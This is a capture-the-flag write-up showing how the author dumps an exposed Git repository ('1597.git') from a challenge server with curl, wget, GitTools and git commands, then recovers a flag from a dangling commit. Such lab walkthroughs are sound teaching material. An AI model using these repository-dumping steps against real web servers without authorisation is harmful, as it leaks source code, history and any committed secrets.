# 1597

## Challenge:

... as in https://xkcd.com/1597/

`http://git.ritsec.club:7000/1597.git/`

## Solution:

The comic linked talks about Git and we’re given a link to a repository. If we navigate to that link, we’re presented with some metadata about the repository:
```bash
[
{ "name":"branches", "type":"directory", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT" },
{ "name":"hooks", "type":"directory", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT" },
{ "name":"info", "type":"directory", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT" },
{ "name":"objects", "type":"directory", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT" },
{ "name":"refs", "type":"directory", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT" },
{ "name":"HEAD", "type":"file", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT", "size":23 },
{ "name":"config", "type":"file", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT", "size":66 },
{ "name":"description", "type":"file", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT", "size":73 }
]
```
We can go a little further and read some additional files:
```bash
$ curl git.ritsec.club:7000/1597.git/HEAD
ref: refs/heads/master
$ curl git.ritsec.club:7000/1597.git/refs/heads/master
dcc402050827e92dbcf2578e24f2cba76f34229c
```
What if we try to list a directory?
```bash
$ curl git.ritsec.club:7000/1597.git/refs/heads/
[
{ "name":"!flag", "type":"file", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT", "size":41 },
{ "name":"master", "type":"file", "mtime":"Fri, 09 Apr 2021 05:49:00 GMT", "size":41 }
]
$ curl git.ritsec.club:7000/1597.git/refs/heads/\!flag
b123f674a07eaf5914eda8845d86b5219fc1de11
```
Interestingly we’ve got two heads, `master` and `!flag`. But before we go too deep, let’s try one of the various tools that will try to download an exposed Git repository for us.
GitTools is popular and the Dumper script lets us customize the directory name – important since this is `1597.git` instead of just `.git`. Let’s give it a try:
```bash
$ ./gitdumper.sh git.ritsec.club:7000/1597.git/ 1597.git --git-dir=1597.git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating 1597.git/1597.git/
[+] Downloaded: HEAD
[+] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[-] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[-] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[+] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/dc/c402050827e92dbcf2578e24f2cba76f34229c
[+] Downloaded: objects/b1/23f674a07eaf5914eda8845d86b5219fc1de11
```
A number of these files didn’t download properly. But we can see that the `master` and `!flag` objects were found and appear to have been downloaded.
```bash
$ cd 1597.git/1597.git
$ tree
.
├── HEAD
├── config
├── description
├── info
│   ├── exclude
│   └── refs
├── logs
│   └── refs
│       ├── heads
│       └── remotes
│           └── origin
├── objects
│   ├── b1
│   ├── dc
│   └── info
│       └── packs
└── refs
    ├── heads
    │   └── master
    ├── remotes
    │   └── origin
    └── wip
        ├── index
        │   └── refs
        │       └── heads
        └── wtree
            └── refs
                └── heads

21 directories, 7 files
```
If we try some Git commands, we can see that it’s not going to be quite this easy:
```bash
$ git log
fatal: bad object HEAD
$ git status
fatal: this operation must be run in a work tree
```
In fact, it looks like we’re going to need to download things manually to go any further as none of our objects were actually downloaded. We can use the hashes we’ve been given so far to figure out the objects to download, where the first byte represents the directory and the remainder is the file:
```bash
$ cd objects/b1
$ curl git.ritsec.club:7000/1597.git/refs/heads/\!flag
b123f674a07eaf5914eda8845d86b5219fc1de11
$ wget git.ritsec.club:7000/1597.git/objects/b1/23f674a07eaf5914eda8845d86b5219fc1de11
--2021-04-11 18:28:49--  http://git.ritsec.club:7000/1597.git/objects/b1/23f674a07eaf5914eda8845d86b5219fc1de11
Resolving git.ritsec.club (git.ritsec.club)... 34.69.61.54
Connecting to git.ritsec.club (git.ritsec.club)|34.69.61.54|:7000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 152 [application/octet-stream]
Saving to: ‘23f674a07eaf5914eda8845d86b5219fc1de11’

23f674a07eaf5914eda8845d86b5219fc1de11                                                       100%[==============================================================================================================================================================================================================================================>]     152  --.-KB/s    in 0s

2021-04-11 18:28:49 (6.04 MB/s) - ‘23f674a07eaf5914eda8845d86b5219fc1de11’ saved [152/152]
```
Once we’ve gotten `master` and `!flag` downloaded, we can decode them and see what they say:
```bash
$ ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < objects/dc/c402050827e92dbcf2578e24f2cba76f34229c
commit 217tree 28488531c9dab07d79c4f776d5a612ee07ee3919
parent bb7917f300dd7ba1e5b45055dc802a8e4e3f19e5
author knif3 <knif3@mail.rit.edu> 1617947340 +0000
committer knif3 <knif3@mail.rit.edu> 1617947340 +0000

Updated the flag
$ ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < objects/b1/23f674a07eaf5914eda8845d86b5219fc1de11
commit 211tree 0e62cb7761a37139d11cefab222ac9a22c191231
parent dcc402050827e92dbcf2578e24f2cba76f34229c
author knif3 <knif3@mail.rit.edu> 1617947340 +0000
committer knif3 <knif3@mail.rit.edu> 1617947340 +0000

More flags
```
That gives us a few more objects to download, `28488531c9dab07d79c4f776d5a612ee07ee3919`, `bb7917f300dd7ba1e5b45055dc802a8e4e3f19e5`, `0e62cb7761a37139d11cefab222ac9a22c191231`, and `dcc402050827e92dbcf2578e24f2cba76f34229c`. Now `git log` has started working and shows up the commits we saw before:
```bash
commit dcc402050827e92dbcf2578e24f2cba76f34229c (HEAD -> master)
Author: knif3 <knif3@mail.rit.edu>
Date:   Fri Apr 9 05:49:00 2021 +0000

    Updated the flag

commit bb7917f300dd7ba1e5b45055dc802a8e4e3f19e5
Author: knif3 <knif3@mail.rit.edu>
Date:   Fri Apr 9 05:49:00 2021 +0000

    Initial Commit
```
For some reason, `git status`, `git commit` and others still fail with `fatal: this operation must be run in a work tree`. We can fix this with `git config --unset core.bare`:
```bash
$ cd ../
$ mv 1597.git .git
$ git config --unset core.bare
$ git status
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
    deleted:    README.md
    deleted:    flag.txt
```
Alright, we see that we’re midway through a commit where two files have been deleted. Following the suggestion Git provides, let’s restore the flag:
```bash
$ git restore --staged flag.txt
$ git checkout flag.txt
error: unable to read sha1 file of flag.txt (8b137891791fe96927ad78e64b0aad7bded08bdc)
Updated 1 path from the index
```
We’ve hit another snag, it looks like there are more objects we’re missing. We get a similar message for `README.md`. Let’s download those and try again:
```bash
$ git checkout README.md
Updated 1 path from the index
$ git checkout flag.txt
Updated 1 path from the index
$ cat README.md                                                                                                                                                                                                                                                                                                    master
# 1597

A git challenge series? Sounds fun.
$ cat flag.txt
```
So we have a blank flag… Remembering our `git log`, the last commit said “Updated the flag”. Maybe our last commit has the answer. Let’s load the flag from the last commit and see if that has our flag:
```bash
$ git checkout bb7917 -- flag.txt
error: Could not read 7f609205d0a20bed8248564bbf85b5f3663286ae
error: pathspec 'flag.txt' did not match any file(s) known to git
$ mkdir .git/objects/7f
$ wget -P .git/objects/7f git.ritsec.club:7000/1597.git/objects/7f/609205d0a20bed8248564bbf85b5f3663286ae
…
$ git checkout bb7917 -- flag.txt
error: unable to read sha1 file of flag.txt (a24cab45003b97e5f5fd3d91032f72e1f52656b3)
$ wget -P .git/objects/a2 git.ritsec.club:7000/1597.git/objects/a2/4cab45003b97e5f5fd3d91032f72e1f52656b3
…
$ git checkout bb7917 -- flag.txt
$ cat flag.txt
Your princess is in another castle
```
Well we’ve got something, but it doesn’t seem to be our flag. Could “another castle” be `README.md`?
```bash
$ git checkout bb7917 -- README.md
$ cat README.md
# 1597

A git challenge series? Sounds fun.
```
Nope, it hasn’t changed at all. But we still have an ace in the hole:
```bash
$ git reset --hard head
HEAD is now at dcc4020 Updated the flag
$ git status
On branch master
nothing to commit, working tree clean
$ git fsck
bad sha1 file: .git/objects/dc/c402050827e92dbcf2578e24f2cba76f34229c.1
Checking object directories: 100% (256/256), done.
dangling commit b123f674a07eaf5914eda8845d86b5219fc1de11
```
Now we’re getting somewhere. There’s a dangling commit that probably contains the true flag:
```bash
$ git reset --hard b123f6
error: unable to read sha1 file of README.md (99ddfa8506ca48892977c7623976a105469a0427)
error: unable to read sha1 file of flag.txt (013a6dddd6001f9401061e56118fe417015d1b4c)
fatal: Could not reset index file to revision 'b123f6'.
$ mkdir .git/objects/01
$ wget -P .git/objects/01 git.ritsec.club:7000/1597.git/objects/01/3a6dddd6001f9401061e56118fe417015d1b4c
…
$ git reset --hard b123f6
error: unable to read sha1 file of README.md (99ddfa8506ca48892977c7623976a105469a0427)
fatal: Could not reset index file to revision 'b123f6'.
$ mkdir .git/objects/99
$ wget -P .git/objects/99 git.ritsec.club:7000/1597.git/objects/99/ddfa8506ca48892977c7623976a105469a0427
…
$ git reset --hard b123f6
HEAD is now at b123f67 More flags
$ cat flag.txt
RS{git_is_just_a_tre3_with_lots_of_branches}
```
And for good measure:
```bash
$ cat README.md
# 1597

What's worse, basing a CTF challenge off of XKCD, or basing a challenge off of git?
```
We finally have our flag: `RS{git_is_just_a_tre3_with_lots_of_branches}`.
